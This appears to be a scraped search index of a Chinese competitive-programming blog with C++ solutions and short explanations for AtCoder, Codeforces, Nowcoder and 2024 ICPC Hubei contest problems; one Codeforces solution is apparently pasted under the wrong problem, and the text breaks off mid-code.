}","date":"2024-07-06","objectID":"/posts/atcoder/abc361/:4:0","tags":["算法"],"title":"abc361","uri":"/posts/atcoder/abc361/"},{"categories":["算法和数据结构"],"content":"Tree and Hamilton Path 2\r最小值为=直径+非直径*2 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const int N = 200010; ll h[N], e[N \u003c\u003c 1], ne[N \u003c\u003c 1], w[N \u003c\u003c 1], idx; ll deg[N]; void add(ll a, ll b, ll c){ w[++idx] = c; e[idx] = b; ne[idx] = h[a]; h[a] = idx; } ll mx = 0, pos = 0; void dfs(ll x, ll fa, ll sum){ for(int i = h[x]; i != -1; i = ne[i]){ int j = e[i]; if(j == fa) continue; ll temp = sum + w[i]; if(temp \u003e mx){ mx = temp; pos = j; } dfs(j, x, temp); } } void solve(){ ll n; cin \u003e\u003e n; memset(h, -1, sizeof h); ll ans = 0; for(ll i = 1; i \u003c n; i++){ ll a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; add(a, b, c); add(b, a, c); deg[a]++; deg[b]++; ans += c; } dfs(1, 0, 0); dfs(pos, 0, 0); cout \u003c\u003c ans * 2 - mx; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; t = 1; while(t--){ solve(); } return 0; } ","date":"2024-07-06","objectID":"/posts/atcoder/abc361/:5:0","tags":["算法"],"title":"abc361","uri":"/posts/atcoder/abc361/"},{"categories":["算法和数据结构"],"content":"A - Array Divisibility\r暴力处理了一下，但是看结果发现直接输出1到n就行了好像。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; cin \u003e\u003e n; vector\u003cint\u003e a(n + 1, 1); for(int i = n / 2 + 1; i \u003c= n; i++) a[i] = i; for(int i = n / 2; i \u003e= 1; i--){ int sum = 0; for(int j = i + i; j \u003c= n; j+=i){ sum += a[j]; } if(sum % i == 0) a[i] = i; else a[i] = i - (sum % i); } for(int i = 1; i \u003c= n; i++) cout \u003c\u003c a[i] \u003c\u003c ' '; cout \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-%23956-div.-2/:1:0","tags":["算法"],"title":"Codeforces Round 956 (Div. 2)","uri":"/posts/codeforces/codeforces-round-%23956-div.-2/"},{"categories":["算法和数据结构"],"content":"B - Corner Twist\r注意到这个操作每次对某一行/某一列都是+1、+2,在模3的意义下就是某一行、一列的和不变。因此只需要检查两个矩阵是不是每一行、每一列对应的和模3下是不是相同的就行。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n, m; cin \u003e\u003e n \u003e\u003e m; vector\u003cint\u003e r(n + 1, 0); vector\u003cint\u003e c(m + 1, 0); for(int i = 1; i \u003c= n; i++){ string s; cin \u003e\u003e s; for(int j = 0; j \u003cm; j++){ r[i] += s[j] - '0'; c[j + 1] += s[j] - '0'; } } int temp = 0; for(int i = 1; i \u003c= n; i++){ string s; cin \u003e\u003e s; for(int j = 0; j \u003cm; j++){ r[i] -= s[j] - '0'; c[j + 1] -= s[j] - '0'; } } int flag = 1; for(int i = 1; i \u003c= n; i++) if(r[i] % 3 != 0) flag = 0; for(int i =1 ; i \u003c= m; i++) if(c[i] % 3 != 0) flag = 0; if(flag) cout \u003c\u003c \"YES\" \u003c\u003c '\\n'; else cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-%23956-div.-2/:2:0","tags":["算法"],"title":"Codeforces Round 956 (Div. 2)","uri":"/posts/codeforces/codeforces-round-%23956-div.-2/"},{"categories":["算法和数据结构"],"content":"C - Have Your Cake and Eat It Too\r​ 暴力枚举六种排列方式，每次从左到右找到满足条件的最小右边界，检查是否存在满足题意的分配方式。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[200010], b[200010], c[200010]; ll tot = 0; ll n; int flag = 0; int st[3]; int la, ra, lb, rb, lc, rc; void dfs(int front, int r, int cnt){ if(r \u003e n) return; for(int i = 0; i \u003c 3 \u0026\u0026 flag == 0; i++){ ll nr = r; if(st[i]) continue; if(cnt == 3){ if(i == 0){ if(a[n] - a[front - 1] \u003c tot) return; la = front , ra = n; }else if(i == 1){ if(b[n] - b[front - 1] \u003c tot) return; lb = front , rb = n; }else{ if(c[n] - c[front - 1] \u003c tot) return; lc = front, rc = n; } flag = 1; return; } st[i] = 1; if(i == 0){ while(nr \u003c= n \u0026\u0026 a[nr] - a[front - 1] \u003c tot) nr++; la = front, ra = nr; dfs(nr + 1, nr + 1, cnt + 1); }else if(i == 1){ while(nr \u003c= n \u0026\u0026 b[nr] - b[front - 1] \u003c tot) nr++; lb = front, rb = nr; dfs(nr + 1, nr + 1, cnt + 1); }else{ while(nr \u003c= n \u0026\u0026 c[nr] - c[front - 1] \u003c tot) nr++; lc = front, rc = nr; dfs(nr + 1, nr + 1, cnt + 1); } if(flag == 1) return; st[i] = 0; } } void solve(){ cin \u003e\u003e n; st[0] = st[1] = st[2] = 0; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], a[i] += a[i - 1]; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e b[i], b[i] += b[i - 1]; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e c[i], c[i] += c[i - 1]; tot = (a[n] + 2) / 3; flag = 0; dfs(1, 1, 1); if(!flag){ cout \u003c\u003c -1 \u003c\u003c '\\n'; return; } cout \u003c\u003c la \u003c\u003c ' ' \u003c\u003c ra \u003c\u003c ' ' \u003c\u003c lb \u003c\u003c ' ' \u003c\u003c rb \u003c\u003c ' ' \u003c\u003c lc \u003c\u003c ' ' \u003c\u003c rc; cout \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-%23956-div.-2/:3:0","tags":["算法"],"title":"Codeforces Round 956 (Div. 2)","uri":"/posts/codeforces/codeforces-round-%23956-div.-2/"},{"categories":["算法和数据结构"],"content":"D - Swap Dilemma\r注意到这个操作可以相邻元素之间进行交换，且两个数组都必须进行交换。要让A、B数组都变成相同的数组，那么可以让他们都变成有序数组，而相邻元素之间交换变成有序数组的最小次数为逆序对的个数。那么只需要两个数组逆序对的个数奇偶性相同就可以变成一样的数组。（奇偶性相同说明差值为偶数，交换次数少的数组偶数次交换可以不变） #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int a[100010], b[100010]; const int maxn = 5e6+9; ll t[maxn]; int n, m; int lowbit(int x){ return x \u0026 -x; } void update(int now){ while(now\u003c=m){ t[now] ++; now += lowbit(now); } } ll query(int now){ ll an = 0; while(now){ an += t[now]; now -= lowbit(now); } return an; } void solve(){ cin \u003e\u003e n; map\u003cint, int\u003e mp; vector\u003cint\u003e aa, bb; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], mp[a[i]]++, aa.push_back(a[i]); for(int i = 1; i \u003c= n; i++) cin \u003e\u003e b[i], mp[b[i]]--, bb.push_back(b[i]); for(auto [k, v] : mp){ if(v != 0) { cout\u003c\u003c \"NO\" \u003c\u003c '\\n'; return; } } sort(aa.begin(),aa.end()); sort(bb.begin(), bb.end()); aa.erase( unique( aa.begin(),aa.end() ) ,aa.end()); bb.erase( unique( bb.begin(),bb.end() ) ,bb.end()); m = aa.size(); int ans = 0; for(int i = 1; i \u003c= n; i++) { a[i] = lower_bound(aa.begin(),aa.end(), a[i]) - aa.begin()+1; ans += query(m)-query(a[i]); update(a[i]); } int ans2 = 0; m = bb.size(); for(int i = 0; i \u003c= n; i++) t[i] = 0; for(int i = 1; i \u003c= n; i++) { b[i] = lower_bound(bb.begin(),bb.end(), b[i]) - bb.begin()+1; ans2 += query(m)-query(b[i]); update(b[i]); } for(int i = 0; i \u003c= n; i++) t[i] = 0; if(ans % 2 != ans2 % 2){ cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; }else{ cout \u003c\u003c \"YES\" \u003c\u003c '\\n'; } } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-%23956-div.-2/:4:0","tags":["算法"],"title":"Codeforces Round 956 (Div. 2)","uri":"/posts/codeforces/codeforces-round-%23956-div.-2/"},{"categories":["算法和数据结构"],"content":"A - Only Pluses\r枚举 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int a, b, c; cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; int ans = 0; for(int i = 0; i \u003c= 5; i++){ for(int j = 0; j + i \u003c= 5; j++){ for(int k = 0; i + j + k \u003c= 5; k++){ ans = max(ans, (a + i) * (b + j) * (c + k)); } } } cout \u003c\u003c ans \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-957-div.-3/:1:0","tags":["算法"],"title":"Codeforces Round 957 (Div. 3)","uri":"/posts/codeforces/codeforces-round-957-div.-3/"},{"categories":["算法和数据结构"],"content":"B - Angry Monk\r非最大值x，进行x-1次操作全拆成1再进行x次操作全部加上。 不唯一的最大值x，同理。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ ll n, k; cin \u003e\u003e n \u003e\u003e k; ll mx = 0; ll ans = 0; map\u003cll, int\u003e mp; vector\u003cll\u003e a(k + 1, 0); for(int i = 1; i \u003c= k; i++){ cin \u003e\u003e a[i]; mx = max(a[i], mx); mp[a[i]]++; } for(int i = 1; i \u003c= k; i++){ if(a[i] != mx){ if(a[i] == 1) ans++; else ans += 2 * a[i] - 1; }else{ if(mp[a[i]] == 1) continue; else{ if(a[i] == 1) ans++; else{ ans += 2 * a[i] - 1; } mp[a[i]]--; } } } cout \u003c\u003c ans \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-957-div.-3/:2:0","tags":["算法"],"title":"Codeforces Round 957 (Div. 3)","uri":"/posts/codeforces/codeforces-round-957-div.-3/"},{"categories":["算法和数据结构"],"content":"C - Gorilla and Permutation\r观察一个序列里面f和g的范围很容易得出结论 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n, m, k; cin \u003e\u003e n \u003e\u003e m \u003e\u003e k; for(int i = n; i \u003e m; i--) cout \u003c\u003c i \u003c\u003c ' '; for(int i = 1; i \u003c= m; i++) cout \u003c\u003c i \u003c\u003c ' '; cout \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; } }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-957-div.-3/:3:0","tags":["算法"],"title":"Codeforces Round 957 (Div. 3)","uri":"/posts/codeforces/codeforces-round-957-div.-3/"},{"categories":["算法和数据结构"],"content":"D - Test of Love\r直接模拟就行。每次从一个木头跳到另一个木头，如果可以就直接跳，如果距离不够，就先跳m距离再看跳之后的位置到下一个木头有没有鳄鱼，没有就统计游泳的长度。同理处理最后一个木头到右岸。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int a[100010], b[100010]; const int maxn = 5e6+9; ll t[maxn]; int n, m; int lowbit(int x){ return x \u0026 -x; } void update(int now){ while(now\u003c=m){ t[now] ++; now += lowbit(now); } } ll query(int now){ ll an = 0; while(now){ an += t[now]; now -= lowbit(now); } return an; } void solve(){ cin \u003e\u003e n; map\u003cint, int\u003e mp; vector\u003cint\u003e aa, bb; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i], mp[a[i]]++, aa.push_back(a[i]); for(int i = 1; i \u003c= n; i++) cin \u003e\u003e b[i], mp[b[i]]--, bb.push_back(b[i]); for(auto [k, v] : mp){ if(v != 0) { cout\u003c\u003c \"NO\" \u003c\u003c '\\n'; return; } } sort(aa.begin(),aa.end()); sort(bb.begin(), bb.end()); aa.erase( unique( aa.begin(),aa.end() ) ,aa.end()); bb.erase( unique( bb.begin(),bb.end() ) ,bb.end()); m = aa.size(); int ans = 0; for(int i = 1; i \u003c= n; i++) { a[i] = lower_bound(aa.begin(),aa.end(), a[i]) - aa.begin()+1; ans += query(m)-query(a[i]); update(a[i]); } int ans2 = 0; m = bb.size(); for(int i = 0; i \u003c= n; i++) t[i] = 0; for(int i = 1; i \u003c= n; i++) { b[i] = lower_bound(bb.begin(),bb.end(), b[i]) - bb.begin()+1; ans2 += query(m)-query(b[i]); update(b[i]); } for(int i = 0; i \u003c= n; i++) t[i] = 0; if(ans % 2 != ans2 % 2){ cout \u003c\u003c \"NO\" \u003c\u003c '\\n'; }else{ cout \u003c\u003c \"YES\" \u003c\u003c '\\n'; } } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-957-div.-3/:4:0","tags":["算法"],"title":"Codeforces Round 957 (Div. 3)","uri":"/posts/codeforces/codeforces-round-957-div.-3/"},{"categories":["算法和数据结构"],"content":"E - Novice’s Mistake\r注意到n*a-b的范围最大是99999，也就是最大是五位数。那么对于一个确定的a，b只可能有五种取值可能是答案。 $len(n)*a-5\u003c=len(n)*a-b \u003c len(n)*a$ 预处理n*a的前五位数存下来，然后枚举每一个a和对应的五个b，根据长度匹配，统计答案。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n; cin \u003e\u003e n; auto len = [\u0026](int n){ int tmp = 0; while(n){ tmp++; n /= 10; } return tmp; }; map\u003cint, int\u003e mp; int n_len = len(n); if(n_len == 1){ int tmp = 0; for(int i = 1; i \u003c= 5; i++){ tmp = tmp * 10 + n; mp[i] = tmp; } }else if(n_len == 2){ mp[1] = n / 10; mp[2] = n; mp[4] = n * 101; mp[3] = n * 10 + n / 10; mp[5] = n * 1010 + n / 10; }else{ mp[1] = n / 100; mp[2] = n / 10; mp[3] = n; mp[4] = n * 10 + n /100; mp[5] = n * 100 + n / 10; } vector\u003cpair\u003cint,int\u003e\u003e ans; for(int a = 1; a \u003c= 10000; a++){ int all = n_len * a; for(int b = all - 5; b \u003c all; b++){ if(b \u003c 1) continue; if(mp[all - b] == n * a - b) ans.push_back({a, b}); } } cout \u003c\u003c ans.size() \u003c\u003c '\\n'; for(auto [a, b] : ans){ cout \u003c\u003c a \u003c\u003c ' ' \u003c\u003c b \u003c\u003c '\\n'; } } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; } ## F - Valuable Cards\r开一个set存x的因子。 假设已经有一个set，对于新遍历到的元素y，如果y不为x的因子就直接不管，如果是，先find x/y存不存在，存在就清空set，答案+1，把y加入新的set；不存在，就遍历set，把y*set中所有为x的因子加入set。 从左到右遍历一遍数组，就得到答案。（答案初始为1，set初始插入1便于编码） #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; void solve(){ int n, x; cin \u003e\u003e n \u003e\u003e x; set\u003cint\u003e has; int cnt = 0; has.insert(1); for(int i = 1; i \u003c= n; i++){ int tmp; cin \u003e\u003e tmp; if(tmp \u003e x || tmp == 1 || x % tmp != 0) continue; else{ if(has.find(x / tmp) == has.end()){ vector\u003cint\u003e temp; for(auto j : has){ if(x % (tmp * j) == 0){ temp.push_back(tmp *j); } } for(auto j : temp) has.insert(j); }else{ cnt++; has.clear(); has.insert(1); has.insert(tmp); } } } cout \u003c\u003c cnt + 1 \u003c\u003c '\\n'; } int main(){ ios::sync_with_stdio(false); cin.tie(0); int t; cin \u003e\u003e t; while(t--){ solve(); } return 0; }","date":"2024-07-06","objectID":"/posts/codeforces/codeforces-round-957-div.-3/:5:0","tags":["算法"],"title":"Codeforces Round 957 (Div. 3)","uri":"/posts/codeforces/codeforces-round-957-div.-3/"},{"categories":["算法和数据结构"],"content":"A.嘤嘤不想做计几喵\r签到 #include\u003cbits/stdc++.h\u003e using namespace std; int main(){ long long a, b; cin \u003e\u003e a \u003e\u003e b; cout \u003c\u003c (a - b) - b * 10; return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:1:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"B.嘤嘤不想打怪兽喵\r签到 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; int main(){ ll h; cin \u003e\u003e h; ll ans = 0; ll cnt = 1; while(h){ ans += cnt; cnt \u003c\u003c= 1; h \u003e\u003e= 1; } cout \u003c\u003c ans; return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:2:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"C.嘤嘤不想买东西喵\r线性DP #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[100010], b[100010]; int main(){ ll n, x; cin \u003e\u003e n \u003e\u003e x; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; ll ans = 0; for(int i = 1; i \u003c= n; i++){ b[i] = max(b[i - 1] + a[i] - x, a[i] - x); ans = max(ans, b[i]); } cout \u003c\u003c ans; return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:3:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"D.嘤嘤不想求异或喵\r异或和的性质 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; long long sumXor(long long x) { if (x % 4 == 0) { return x; } if (x % 4 == 1) { return 1; } if (x % 4 == 2) { return x + 1; } return 0; } int main(){ ll t; cin \u003e\u003e t; while(t--){ ll l, r; cin \u003e\u003e l \u003e\u003e r; cout \u003c\u003c (sumXor(l - 1) ^ sumXor(r)) \u003c\u003c '\\n'; } return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:4:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"E.嘤嘤不想解方程喵\r将y代入式子得到一个二次方程，判断是否有解即可。 注意会爆long long #include\u003cbits/stdc++.h\u003e using namespace std; //0 1 2 typedef long long ll; ll a1, b1, c1, a2, b2, c2; int main(){ ll t; cin \u003e\u003e t; while(t--){ cin \u003e\u003e a1 \u003e\u003e b1 \u003e\u003e c1 \u003e\u003e a2 \u003e\u003e b2 \u003e\u003e c2; __int128 a = a1 * b2; __int128 b = b1 * b2 + a2; __int128 c = c1*b2+c2; if(a == 0){ if(b == 0){ if(c == 0){ cout \u003c\u003c \"INF\" \u003c\u003c endl; }else{ cout \u003c\u003c \"0\" \u003c\u003c endl; } }else{ cout \u003c\u003c \"1\" \u003c\u003c endl; } }else{ __int128 deta = b * b - 4 * a * c; if(deta \u003e 0) cout \u003c\u003c \"2\" \u003c\u003c endl; else if(deta == 0) cou t \u003c\u003c \"1\" \u003c\u003c endl; else cout \u003c\u003c \"0\" \u003c\u003c endl; } } return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:5:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"F.嘤嘤不想找最小喵\r嘤嘤有一个长度为 $n$ 的数组 $a$ ，你需要找到一个最小的正整数 $k$ ，满足 $a_i+a_{i+2k}=2 \\times a_{i+k}(1 \\leq i \\leq n - 2k)$ 喵~。 遍历i可以发现，这个数组可以分成三段$[a_1, a_2, …,a_{n-2k}] + [a_{1+2k},a_{2+2k},…,a_n]=2*[a_{1+k},a_{2+k},…,a_{n-k}]$ 只要使整个式子成立的k就是满足条件的k。但是遍历k和数组复杂度是$O(N^2 )$ 的显然会T。通过预处理再枚举K的话，时间复杂度就行。但是预处理要能得到每一个对应关系，如$a_i+a_{i+2k}=2 \\times a_{i+k}(1 \\leq i \\leq n - 2k)$。那么可以使用一个很大的进制数，用一个数位表示一个a，三个进制数的一个对应数位表示一个对应关系（进制足够大，不产生进位），那么就可以直接通过四则运算判断。那么就可以类比字符串哈希的写法做这道题。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; typedef unsigned long long ull; ll a[500010]; ull h[500010]; ull p[500010]; const ull base = 13331; int main(){ ios::sync_with_stdio(false); cin.tie(0); int n; cin \u003e\u003e n; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; p[0] = 1; for(int i = 1; i \u003c= n; i++){ h[i] = h[i - 1] * base + a[i]; p[i] = p[i - 1] * base; } auto get_hash = [\u0026](int l, int r){ return h[r] - h[l - 1] * p[r - l + 1]; }; for(int k = 1; ; k++){ if(get_hash(1, n - 2 * k) + get_hash(1 + 2 * k, n) == 2 * get_hash(1 + k, n - k)){ cout \u003c\u003c k; return 0; } } return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/:6:0","tags":["算法"],"title":"牛客周赛Round49","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E5%91%A8%E8%B5%9B-round-49/"},{"categories":["算法和数据结构"],"content":"A.小红的最大价值\r考虑最大的元素能不能去到，即题中max的部分，则选取另一个元素为最小值，若极差\u003ek则可以取到最小值；否则不管怎么选取，都会走第二个选项min，则此时答案为第二大的值。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; ll a[100010]; int main(){ int n, k; cin \u003e\u003e n \u003e\u003e k; for(int i = 1; i \u003c= n; i++) cin \u003e\u003e a[i]; sort(a + 1, a + 1 + n); if(a[n] - a[1] \u003e k){ cout \u003c\u003c a[n]; }else{ cout \u003c\u003c a[n - 1]; } return 0; }","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B127/:1:0","tags":["算法"],"title":"牛客练习赛127","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B127/"},{"categories":["算法和数据结构"],"content":"小红的约数\r一个数的约数等于质因数的组合。 假设原有一个质因数及对应指数的集合为A，由它产生的约数的和为B。 现在向这个集合中添加质数P，它的指数为a个。 则新产生的约数的和可以表示为 $$ B*(1+P^1+P^2+…+P^a) $$ 换句话说，在这个新集合的约数和里，可以将质数P的多项式提取出来。依次类推可以得到： $$ f_d(X)=\\prod_{p}{\\sum_{i=0}^{a}(p^i)^d },p是X的质因数 $$ 可以观察到，是对等比数列求和，则可以化简为: $$ f_d(X)=\\prod_{p}{p^{(a+1)*d}-1\\over p^d - 1},p是X的质因数 $$ 注意当$$p^d==1$$时，对应的和应为a+1。 #include\u003cbits/stdc++.h\u003e using namespace std; typedef long long ll; const ll mod = 1e9 + 7; ll ksm(ll a, ll b){ ll res = 1; while(b){ if(b \u0026 1) res = (res * a) % mod; a = (a * a) % mod; b \u003e\u003e= 1; } return res; } ll inv(ll a){ return ksm(a, mod - 2); } int main(){ ll w, d; cin \u003e\u003e w \u003e\u003e d; ll ans = 1; for(ll i = 1; i \u003c= w; i++){ ll p, a; cin \u003e\u003e p \u003e\u003e a; ll v = ksm(p, d); if(v == 1){ ans = (ans * (a + 1)) % mod; continue; } ll temp1 = (ksm(v, a + 1) - 1 + mod) % mod; ll temp2 = (v - 1 + mod) % mod; ll temp = temp1 * inv(temp2) % mod; ans = ans * temp % mod; } cout \u003c\u003c ans; return 0; } ","date":"2024-07-06","objectID":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B127/:2:0","tags":["算法"],"title":"牛客练习赛127","uri":"/posts/nowcoder/%E7%89%9B%E5%AE%A2%E7%BB%83%E4%B9%A0%E8%B5%9B127/"},{"categories":null,"content":"瞻鹤's friends","date":"2024-06-11","objectID":"/friends/","tags":null,"title":"友链","uri":"/friends/"},{"categories":null,"content":"Base info\r- nickname: Lruihao avatar: https://lruihao.cn/images/avatar.jpg url: https://lruihao.cn description: Lruihao's Note","date":"2024-06-11","objectID":"/friends/:1:0","tags":null,"title":"友链","uri":"/friends/"},{"categories":null,"content":"Friendly Reminder\rNotice\rIf you want to exchange link, please leave a comment in the above format. (personal non-commercial blogs / websites only)  Website failure, stop maintenance and improper content may be unlinked! Those websites that do not respect other people’s labor achievements, reprint without source, or malicious acts, please do not come to exchange. ","date":"2024-06-11","objectID":"/friends/:2:0","tags":null,"title":"友链","uri":"/friends/"},{"categories":["ICPC"],"content":"2024年ICPC湖北省赛\rDashboard - The 2024 International Collegiate Programming Contest in Hubei Province, China - Codeforces ","date":"2024-06-11","objectID":"/posts/583bc6c/:0:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - A - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:1:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r固定a为1，则b=lcm / gcd ","date":"2024-06-11","objectID":"/posts/583bc6c/:1:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rll gcd(ll a, ll b){ return b? gcd(b, a % b):a; } void solve(){ ll x, y; cin \u003e\u003e x \u003e\u003e y; ll gc = gcd(x, y); ll lc = x * y / gc; ll d = lc / gc; cout \u003c\u003c 1 \u003c\u003c ' ' \u003c\u003c d \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:1:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - B - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:2:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r找最小面积的多边形，即面积最小的三角形。 海伦公式精度会WA，使用向量叉积求三角形面积即可（叉积为0时向量共线，continue） ","date":"2024-06-11","objectID":"/posts/583bc6c/:2:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rstruct point{ double x, y; point(){} point(double x, double y): x(x), y(y){} point operator + (point b){return point(x + b.x, y + b.y);}; point operator - (point b){return point(x - b.x, y - b.y);}; }f[110]; typedef point Vector; double cross(Vector a, Vector b){return a.x*b.y - a.y*b.x;} double area2(point a, point b, point c){ return cross(b -a , c-a); } void solve(){ int n; cin \u003e\u003e n; double ans = 1e18; for(int i = 1; i \u003c= n; i++) { cin \u003e\u003e f[i].x \u003e\u003e f[i].y; } int flag = 0; for(int i = 1; i \u003c= n - 2; i++) for(int j = i + 1; j \u003c= n - 1; j++) for(int k = j + 1; k \u003c= n; k++){ double tmp = fabs(area2(f[i], f[j], f[k]) / 2.0); //cout \u003c\u003c tmp \u003c\u003c '\\n'; if(tmp == 0) continue; flag = 1; ans = min(ans, tmp); } if(!flag){ printf(\"-1\\n\"); return; } printf(\"%.7lf\\n\", ans); }","date":"2024-06-11","objectID":"/posts/583bc6c/:2:2","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - E - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:3:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rvoid solve(){ ll n, x, a, b; cin \u003e\u003e n \u003e\u003e x \u003e\u003e a \u003e\u003e b; cout \u003c\u003c (n - x) * a + x * b \u003c\u003c '\\n'; }","date":"2024-06-11","objectID":"/posts/583bc6c/:3:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Problem - G - Codeforces\r","date":"2024-06-11","objectID":"/posts/583bc6c/:4:0","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"思路\r考虑到棋盘为19*19，每次落子检查最多5个连通块（落子的上下左右+自己），bfs暴力搜索气为0的连通块，暴力取子。 注意题目中的去子顺序。 ","date":"2024-06-11","objectID":"/posts/583bc6c/:4:1","tags":["ICPC"],"title":"2024年ICPC湖北省赛","uri":"/posts/583bc6c/"},{"categories":["ICPC"],"content":"Code\rint mp[22][22]; int st[22][22]; int dx[] = {-1,1,0,0, 0}; int dy[] = {0,0,-1,1,0}; void solve(){ int m; scanf(\"%d\", \u0026m); int flag = 1; //1 black 2 w; while(m--){ for(int i = 1; i 